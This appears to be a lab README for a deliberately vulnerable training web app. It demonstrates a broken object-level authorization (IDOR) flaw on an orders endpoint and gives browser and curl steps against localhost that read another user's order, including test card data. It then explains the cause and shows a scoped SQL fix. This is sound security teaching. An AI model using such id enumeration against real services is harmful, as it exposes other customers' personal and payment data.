# Lab 01: BOLA / IDOR on orders

`GET /orders/:id` loads any order by numeric id. Ownership is never checked, so one customer can read another customer's order — product, address, full card number and CVV included. The JSON API has the same flaw with `?user_id=`. With guest checkout in the mix, orders may even have no owner at all (`user_id` is nullable) — try enumerating ids after buying as guest.

**OWASP Top 10:2025:** [A01 Broken Access Control](https://owasp.org/Top10/2025/)

**Code:** `routes/orders.js` (`/orders/:id`), `routes/api/v1.js` (`/orders`), `model/db.js` (`orderById`, `ordersForUser`) — see `VULN:` / `SAFE:` comments

## Exploit

1. `docker compose up --build`, log in as **alice** (alice123).
2. Bob's order is id 1. Open:

```text
http://localhost:8888/orders/1
```

Alice sees Bob's order with card `4242 4242 4242 4242` and CVV `123`.

3. API variant: get any token and read anyone's orders:

```bash
TOKEN=$(curl -s -X POST http://localhost:8888/api/v1/auth/token \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

curl -s "http://localhost:8888/api/v1/orders?user_id=2" -H "Authorization: Bearer $TOKEN"
```

## Why it happens

The id reaches the query; the *session* never does. Authorization needs both.

## Fix

In `model/db.js`, scope every read to the caller:

```js
function orderById(orderId, userId) {
  return pool.query(
    "SELECT * FROM orders WHERE id = $1 AND user_id = $2", [orderId, userId]
  );
}
```

In `routes/api/v1.js`, drop the `user_id` parameter and always filter by `req.apiUser.id` (re-check the role server-side if admins need the override). Use object-level authorization checks on every handler that takes an id.

## Verify

After the fix, `/orders/1` as alice returns 404, and `?user_id=2` returns only alice's orders (none).